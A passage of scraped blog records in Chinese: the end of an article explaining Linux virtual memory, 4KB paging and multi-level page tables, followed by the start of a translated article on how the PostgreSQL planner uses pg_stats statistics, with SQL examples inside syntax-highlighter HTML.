-->\r\n\n</div>\n<p>本质上说，虚拟内存地址剥夺了应用程序自由访问物理内存地址的权利。进程对物理内存的访问，必须经过操作系统的审查。因此，掌握着内存对应关系的操作系统，也掌握了应用程序访问内存的闸门。借助虚拟内存地址，操作系统可以保障进程空间的独立性。只要操作系统把两个进程的进程空间对应到不同的内存区域，就让两个进程空间成为“老死不相往来”的两个小王国。两个进程就不可能相互篡改对方的数据，进程出错的可能性就大为减少。</p>\n<p>另一方面，有了虚拟内存地址，内存共享也变得简单。操作系统可以把同一物理内存区域对应到多个进程空间。这样，不需要任何的数据复制，多个进程就可以看到相同的数据。内核和共享库的映射，就是通过这种方式进行的。每个进程空间中，最初一部分的虚拟内存地址，都对应到物理内存中预留给内核的空间。这样，所有的进程就可以共享同一套内核数据。共享库的情况也是类似。对于任何一个共享库，计算机只需要往物理内存中加载一次，就可以通过操纵对应关系，来让多个进程共同使用。IPO中的共享内存，也有赖于虚拟内存地址。</p>\n<h3>内存分页</h3>\n<p>虚拟内存地址和物理内存地址的分离，给进程带来便利性和安全性。但虚拟内存地址和物理内存地址的翻译，又会额外耗费计算机资源。在多任务的现代计算机中，虚拟内存地址已经成为必备的设计。那么，操作系统必须要考虑清楚，如何能高效地翻译虚拟内存地址。</p>\n<p>记录对应关系最简单的办法，就是把对应关系记录在一张表中。为了让翻译速度足够地快，这个表必须加载在内存中。不过，这种记录方式惊人地浪费。如果树莓派1GB物理内存的每个字节都有一个对应记录的话，那么光是对应关系就要远远超过内存的空间。由于对应关系的条目众多，搜索到一个对应关系所需的时间也很长。这样的话，会让树莓派陷入瘫痪。</p>\n<p>因此，Linux采用了分页（paging）的方式来记录对应关系。所谓的分页，就是以更大尺寸的单位页（page）来管理内存。在Linux中，通常每页大小为4KB。如果想要获取当前树莓派的内存页大小，可以使用命令：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671dc5ade640800891\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$getconf PAGE_SIZE</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671dc5ade640800891-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671dc5ade640800891-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-e\">getconf </span><span class=\"crayon-v\">PAGE_SIZE</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n\n</div>\n<p>得到结果，即内存分页的字节数：</p>\n<blockquote><p><em id=\"__mceDel\">4096</em></p></blockquote>\n<p>返回的4096代表每个内存页可以存放4096个字节，即4KB。Linux把物理内存和进程空间都分割成页。</p>\n<p>内存分页，可以极大地减少所要记录的内存对应关系。我们已经看到，以字节为单位的对应记录实在太多。如果把物理内存和进程空间的地址都分成页，内核只需要记录页的对应关系，相关的工作量就会大为减少。由于每页的大小是每个字节的4000倍。因此，内存中的总页数只是总字节数的四千分之一。对应关系也缩减为原始策略的四千分之一。分页让虚拟内存地址的设计有了实现的可能。</p>\n<p>无论是虚拟页，还是物理页，一页之内的地址都是连续的。这样的话，一个虚拟页和一个物理页对应起来，页内的数据就可以按顺序一一对应。这意味着，虚拟内存地址和物理内存地址的末尾部分应该完全相同。大多数情况下，每一页有4096个字节。由于4096是2的12次方，所以地址最后12位的对应关系天然成立。我们把地址的这一部分称为偏移量（offset）。偏移量实际上表达了该字节在页内的位置。地址的前一部分则是页编号。操作系统只需要记录页编号的对应关系。</p>\n<p style=\"text-align: center\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/c3b996a8b26918293109b8662e1f721b.png\" alt=\"\" width=\"532\" height=\"402\"><br>\n图2 地址翻译过程</p>\n<h3>多级分页表</h3>\n<p>内存分页制度的关键，在于管理进程空间页和物理页的对应关系。操作系统把对应关系记录在分页表（page table）中。这种对应关系让上层的抽象内存和下层的物理内存分离，从而让Linux能灵活地进行内存管理。由于每个进程会有一套虚拟内存地址，那么每个进程都会有一个分页表。为了保证查询速度，分页表也会保存在内存中。分页表有很多种实现方式，最简单的一种分页表就是把所有的对应关系记录到同一个线性列表中，即如图2中的“对应关系”部分所示。</p>\n<p>这种单一的连续分页表，需要给每一个虚拟页预留一条记录的位置。但对于任何一个应用进程，其进程空间真正用到的地址都相当有限。我们还记得，进程空间会有栈和堆。进程空间为栈和堆的增长预留了地址，但栈和堆很少会占满进程空间。这意味着，如果使用连续分页表，很多条目都没有真正用到。因此，Linux中的分页表，采用了多层的数据结构。多层的分页表能够减少所需的空间。</p>\n<p>我们来看一个简化的分页设计，用以说明Linux的多层分页表。我们把地址分为了页编号和偏移量两部分，用单层的分页表记录页编号部分的对应关系。对于多层分页表来说，会进一步分割页编号为两个或更多的部分，然后用两层或更多层的分页表来记录其对应关系，如图3所示。</p>\n<p style=\"text-align: center\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/36d635123634d7505ddb1dc5f8146bfe.png\" alt=\"\" width=\"369\" height=\"444\"> 图3 多层分页表</p>\n<p style=\"text-align: center\">\n</p><p style=\"text-align: left\">在图3的例子中，页编号分成了两级。第一级对应了前8位页编号，用2个十六进制数字表示。第二级对应了后12位页编号，用3个十六进制编号。二级表记录有对应的物理页，即保存了真正的分页记录。二级表有很多张，每个二级表分页记录对应的虚拟地址前8位都相同。比如二级表0x00，里面记录的前8位都是0x00。翻译地址的过程要跨越两级。我们先取地址的前8位，在一级表中找到对应记录。该记录会告诉我们，目标二级表在内存中的位置。我们再在二级表中，通过虚拟地址的后12位，找到分页记录，从而最终找到物理地址。</p>\n<p>多层分页表就好像把完整的电话号码分成区号。我们把同一地区的电话号码以及对应的人名记录同通一个小本子上。再用一个上级本子记录区号和各个小本子的对应关系。如果某个区号没有使用，那么我们只需要在上级本子上把该区号标记为空。同样，一级分页表中0x01记录为空，说明了以0x01开头的虚拟地址段没有使用，相应的二级表就不需要存在。正是通过这一手段，多层分页表占据的空间要比单层分页表少了很多。<br>\n多层分页表还有另一个优势。单层分页表必须存在于连续的内存空间。而多层分页表的二级表，可以散步于内存的不同位置。这样的话，操作系统就可以利用零碎空间来存储分页表。还需要注意的是，这里简化了多层分页表的很多细节。最新Linux系统中的分页表多达3层，管理的内存地址也比本章介绍的长很多。不过，多层分页表的基本原理都是相同。</p>\n<p>综上，我们了解了内存以页为单位的管理方式。在分页的基础上，虚拟内存和物理内存实现了分离，从而让内核深度参与和监督内存分配。应用进程的安全性和稳定性因此大为提高。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114225\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114225votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114225\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"}
{"title": "10 个你不知道的 PostgreSQL 功能：创建统计信息", "url": "http://blog.jobbole.com/114232/", "create_date": "2018/07/26", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2013/03/PostgreSQL-logo.gif"], "url_object_id": "00312fe9a1766a63254d48dfcbcf1670", "praise_nums": 1, "fav_nums": 1, "comment_nums": 0, "tags": "IT技术,PostgreSQL,数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.citusdata.com/blog/2018/03/06/postgres-planner-and-its-usage-of-statistics/\">Samay Sharma</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/postgres-planner-and-its-usage-of-statistics\">开源中国</a>   </div><p>如果你曾使用 Postgres 做过一些性能优化，你或许已经使用过 EXPLAIN 。EXPLAIN 向你展示了 PostgreSQL planner 为提供的语句生成的执行计划。它说明了语句涉及到的表将会使用顺序扫描、索引扫描等方式进行扫描，在使用多表的情况下将会使用连接算法。但是， Postgres 是如何产生这些规划的？</p>\n<p>决定使用哪种规划的一个非常重要的输入是 planner 收集到的<a href=\"https://www.postgresql.org/docs/10/static/planner-stats.html\" target=\"_blank\" rel=\"nofollow\">数据统计</a>。这些统计的数据能够使 planner 评估执行规划的某一部分会返回多少行，继而影响到使用哪一种规划或连接算法。它们主要是通过运行 ANALYZE 或 VACUUM（和一些 DDL 命令，比如说 CREATE INDEX )来采集或更新的。</p>\n<p>这些统计信息由 planner 存储在 <a href=\"https://www.postgresql.org/docs/9.3/static/catalog-pg-class.html\" rel=\"nofollow\">pg_class</a> 和 <a href=\"https://www.postgresql.org/docs/10/static/catalog-pg-statistic.html\" rel=\"nofollow\">pg_statistics</a> 中。Pg_class 基本上存储了每个表和索引中的条目总数，以及它们所占用的磁盘块数。Pg_statistic 存储关于每列的统计信息，例如哪些列的 % 值为 nul l，哪些是最常见的值，直方图边界等。你可以查看下面的示例，以了解 Postgres 在下表中为 col1 收集的统计信息类型。下面的查询输出展示了 planner（正确地）预估表中列 col1 中有 1000 个不同的值，并且还对最常见的值、频率等进行了其他预估。</p>\n<p>请注意，我们已经查询了 <a href=\"https://www.postgresql.org/docs/10/static/view-pg-stats.html\" rel=\"nofollow\">pg_stats</a>（一个拥有更多可读版本的列统计信息的视图）。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671cd4e1b334516590\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE TABLE tbl (                                                                        \r\n    col1 int,                                                                             \r\n    col2 int                                                                              \r\n);                                                                                        \r\n\r\nINSERT INTO tbl SELECT i/10000, i/100000                                                  \r\nFROM generate_series (1,10000000) s(i);                                                   \r\n\r\nANALYZE tbl;                                     \r\n\r\nselect * from pg_stats where tablename = 'tbl' and attname = 'col1';\r\n-[ RECORD 1 ]----------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\r\nschemaname             | public\r\ntablename              | tbl\r\nattname                | col1\r\ninherited              | f\r\nnull_frac              | 0\r\navg_width              | 4\r\nn_distinct             | 1000\r\nmost_common_vals       | {318,564,596,...}\r\nmost_common_freqs      | {0.00173333,0.0017,0.00166667,0.00156667,...}\r\nhistogram_bounds       | {0,8,20,30,39,...}\r\ncorrelation            | 1\r\nmost_common_elems      | \r\nmost_common_elem_freqs | \r\nelem_count_histogram   |</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e1b334516590-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e1b334516590-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e1b334516590-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e1b334516590-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e1b334516590-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e1b334516590-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e1b334516590-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e1b334516590-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e1b334516590-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e1b334516590-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e1b334516590-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e1b334516590-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e1b334516590-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e1b334516590-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e1b334516590-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e1b334516590-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e1b334516590-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e1b334516590-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e1b334516590-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e1b334516590-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e1b334516590-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e1b334516590-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e1b334516590-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e1b334516590-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e1b334516590-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e1b334516590-26\">26</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671cd4e1b334516590-1\"><span class=\"crayon-i\">CREATE</span> <span class=\"crayon-i\">TABLE</span> <span class=\"crayon-i\">tbl</span> <span class=\"crayon-sy\">(</span>                                                                        </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e1b334516590-2\">    <span class=\"crayon-i\">col1</span> <span class=\"crayon-t\">int</span><span class=\"crayon-sy\">,</span>                                                                             </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e1b334516590-3\">    <span class=\"crayon-i\">col2</span> <span class=\"crayon-t\">int</span>                                                                              </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e1b334516590-4\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span>                                                                                        </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e1b334516590-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e1b334516590-6\"><span class=\"crayon-i\">INSERT</span> <span class=\"crayon-i\">INTO</span> <span class=\"crayon-i\">tbl</span> <span class=\"crayon-i\">SELECT</span> <span class=\"crayon-v\">i</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">10000</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">i</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">100000</span>                                                  </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e1b334516590-7\"><span class=\"crayon-i\">FROM</span> <span class=\"crayon-v\">generate</span><span class=\"crayon-sy\">_</span>series <span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">10000000</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-e\">s</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span>                                                   </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e1b334516590-8\"> </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e1b334516590-9\"><span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-v\">tbl</span><span class=\"crayon-sy\">;</span>                                     </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e1b334516590-10\"> </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e1b334516590-11\"><span class=\"crayon-i\">select</span> <span class=\"crayon-o\">*</span> <span class=\"crayon-i\">from</span> <span class=\"crayon-v\">pg</span><span class=\"crayon-sy\">_</span>stats <span class=\"crayon-i\">where</span> <span class=\"crayon-i\">tablename</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-s\">'tbl'</span> <span class=\"crayon-st\">and</span> <span class=\"crayon-i\">attname</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-s\">'col1'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e1b334516590-12\"><span class=\"crayon-o\">-</span><span class=\"crayon-sy\">[</span> <span class=\"crayon-i\">RECORD</span> <span class=\"crayon-cn\">1</span> <span class=\"crayon-sy\">]</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span 